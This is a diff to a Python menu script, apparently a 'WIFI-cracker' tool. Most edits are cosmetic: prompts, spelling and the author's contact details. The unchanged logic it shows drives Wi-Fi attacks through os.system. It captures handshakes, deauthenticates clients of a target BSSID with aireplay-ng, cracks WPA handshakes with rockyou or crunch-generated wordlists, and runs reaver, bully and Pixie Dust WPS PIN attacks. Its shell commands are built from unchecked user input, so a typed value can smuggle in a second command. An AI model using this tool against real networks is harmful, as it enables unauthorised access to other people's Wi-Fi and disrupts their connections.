@@ -25,7 +25,7 @@ def intro():
 (5)Install Wireless tools                   
 (6)Crack Handshake with rockyou.txt (Handshake needed)
 (7)Crack Handshake with wordlist    (Handshake needed)
-(8)Crack Handshake without wordlist (Handshake,essid needed)
+(8)Crack Handshake without wordlist (Handshake,bssid needed)
 (9)Create wordlist                                     
 (10)WPS Networks attacks (Bssid,monitor mode needed)
 (11)Scan for WPS Networks
@@ -33,23 +33,23 @@ def intro():
 (00)Exit
 -----------------------------------------------------------------------
 """)
-    print("\nEnter your choise here : !# ")
-    var = int(input(""))
+    print("\nEnter your choice here ")
+    var = int(input("(WIFI-cracker)>"))
     if var == 1 :
         print("\nEnter the interface:(Default(wlan0/wlan1))")
-        interface = input("")
+        interface = input("(WIFI-cracker)>")
         order = "airmon-ng start {} && airmon-ng check kill".format(interface)
         geny  = os.system(order)
         intro()
     elif var == 2 :
         print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
-        interface = input("")
+        interface = input("(WIFI-cracker)>")
         order = "airmon-ng stop {} && service network-manager restart".format(interface)
         geny  = os.system(order)
         intro()
     elif var == 3 :
         print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
-        interface = input("")
+        interface = input("(WIFI-cracker)>")
         order = "airodump-ng {} -M".format(interface)
         print("When Done Press CTRL+c")
         cmd = os.system("sleep 3")
@@ -58,7 +58,7 @@ def intro():
         intro()
     elif var == 4 :
         print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
-        interface = input("")
+        interface = input("(WIFI-cracker)>")
         order     = "airodump-ng {} -M".format(interface)
         print("\nWhen Done Press CTRL+c")
         print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
@@ -67,14 +67,14 @@ def intro():
         cmd       = os.system("sleep 7")
         geny      = os.system(order)
         print("\nEnter the bssid of the target?")
-        bssid     = str(input(""))
+        bssid     = str(input("(WIFI-cracker)>"))
         print("\nEnter the channel of the network?")
         channel   = int(input())
         print("Enter the path of the output file ?")
-        path = str(input(""))
+        path = str(input("(WIFI-cracker)>"))
         print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
         print("the number of the packets Depends on the Distance Between you and the network")
-        dist = int(input(""))
+        dist = int(input("(WIFI-cracker)>"))
         order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
         geny = os.system(order)
         intro()
@@ -102,7 +102,7 @@ def intro():
 91) wifite v2
 0)install all wireless tools
 """)
-            w = int(input("Enter The number of the tool : >>> "))
+            w = int(input("Enter The number of the tool : > "))
             if w == 1 :
                 cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
             elif w == 90:
@@ -181,9 +181,9 @@ def intro():
         cmd = os.system("clear")
         print("""
 Hi.
-My Name is Arjun, A Hacker,Bug Bounty Hunter,Currently Working as Student.
+My Name is Arjun Patel, A Hacker,Currently Working as Student.
 you can me find on Instagram
-https://www.instagram.com/aj_xyz_855
+https://www.instagram.com/aj.tar.gz
 Contact me-- timeup918273645@gmail.com
 Feel Free to Contact,
 """)
@@ -193,7 +193,7 @@ Feel Free to Contact,
     elif var == 6:
         if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
             print("\nEnter the path of the handshake file ?")
-            path = str(input(""))
+            path = str(input("(WIFI-cracker)>"))
             order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
             print("\nTo exit Press CTRL +C")
             geny  = os.system(order)
@@ -202,7 +202,7 @@ Feel Free to Contact,
         elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
             cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
             print("\nEnter the path of the handshake file ?")
-            path = str(input(""))
+            path = str(input("(WIFI-cracker)>"))
             order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
             print("\nTo exit Press CTRL +C")
             geny  = os.system(order)
@@ -210,21 +210,21 @@ Feel Free to Contact,
             exit()
     elif var == 7 :
         print("\nEnter the path of the handshake file ?")
-        path = str(input(""))
+        path = str(input("(WIFI-cracker)>"))
         print("\nEnter the path of the wordlist ?")
-        wordlist = str(input(""))
+        wordlist = str(input("(WIFI-cracker)>"))
         order = ("aircrack-ng {} -w {}").format(path,wordlist)
         geny = os.system(order)
         exit()
     elif var == 8 :
-        print("\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
-        essid = str(input(""))
+        print("\nEnter the Bssid of the network ?(Be careful when you type it and use 'the name of the network') ")
+        essid = str(input("(WIFI-cracker)>"))
         print("\nEnter the path of the handshake file ?")
-        path = str(input(""))
+        path = str(input("(WIFI-cracker)>"))
         print("\nEnter the minimum length of the password (8/64)?")
-        mini = int(input(""))
+        mini = int(input("(WIFI-cracker)>"))
         print("\nEnter the maximum length of the password (8/64)?")
-        max  = int(input(""))
+        max  = int(input("(WIFI-cracker)>"))
         print("""
 ---------------------------------------------------------------------------------------
 (1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
@@ -241,11 +241,11 @@ Feel Free to Contact,
 (12) Your Own Words and numbers
 -----------------------------------------------------------------------------------------
 Crack Password Could Take Hours,Days,Weeks,Months to complete
-and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
-may reach to Hundreds of TeRa Bits so Be patiant
+and the speed of cracking will reduce because you generate a Huge,Huge Password list
+may reach to Hundreds of TeRa Bits so Be patient
 """)
-        print("\nEnter your choise here : ?")
-        set = str(input(""))
+        print("\nEnter your choice here : ?")
+        set = str(input("(WIFI-cracker)>"))
         if set == "1":
             test = str("abcdefghijklmnopqrstuvwxyz")
             order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
@@ -302,13 +302,13 @@ may reach to Hundreds of TeRa Bits so Be patiant
         cmd5 = os.system("sleep 3d")
     elif var == 9 :
         print("\nEnter the minimum length of the password (8/64)?")
-        mini = int(input(""))
+        mini = int(input("(WIFI-cracker)>"))
         print("\nEnter the maximum length of the password (8/64)?")
-        max  = int(input(""))
+        max  = int(input("(WIFI-cracker)>"))
         print("\nEnter the path of the output file?")
-        path = str(input(""))
+        path = str(input("(WIFI-cracker)>"))
         print("\nEnter what you want the password contain ?")
-        password = str(input(""))
+        password = str(input("(WIFI-cracker)>"))
         order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
         geny = os.system(order)
         a = ("The wordlist in >>>>> {} Named as SRART").format(path)
@@ -323,22 +323,22 @@ may reach to Hundreds of TeRa Bits so Be patiant
 0) Back to Main Menu
 """)
         print("Choose the kind of the attack ?")
-        attack = int(input(""))
+        attack = int(input("(WIFI-cracker)>"))
         if attack == 1:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
-            interface = str(input(""))
+            interface = str(input("(WIFI-cracker)>"))
             print("\nEnter the bssid of the network ?")
-            bssid = str(input(""))
+            bssid = str(input("(WIFI-cracker)>"))
             order = ("reaver -i {} -b {} -vv").format(interface,bssid)
             geny = os.system(order)
             intro()
         elif attack == 2:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
-            interface = str(input(""))
+            interface = str(input("(WIFI-cracker)>"))
             print("\nEnter the bssid of the network ?")
-            bssid = str(input(""))
+            bssid = str(input("(WIFI-cracker)>"))
             print("\nEnter the channel of the network ?")
-            channel = int(input(""))
+            channel = int(input("(WIFI-cracker)>"))
             order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
             geny = os.system(order)
             intro()
@@ -347,9 +347,9 @@ may reach to Hundreds of TeRa Bits so Be patiant
             intro()
         elif attack == 4:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
-            interface = str(input(""))
+            interface = str(input("(WIFI-cracker)>"))
             print("\nEnter the bssid of the network ?")
-            bssid = str(input(""))
+            bssid = str(input("(WIFI-cracker)>"))
             order = ("reaver -i {} -b {} -K").format(interface,bssid)
             geny = os.system(order)
             intro()
@@ -357,7 +357,7 @@ may reach to Hundreds of TeRa Bits so Be patiant
             intro()
     elif var == 11:
         print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
-        interface = str(input(""))
+        interface = str(input("(WIFI-cracker)>"))
         order = "airodump-ng -M --wps {}".format(interface)
         geny = os.system(order)
         cmd = os.system("sleep 5 ")
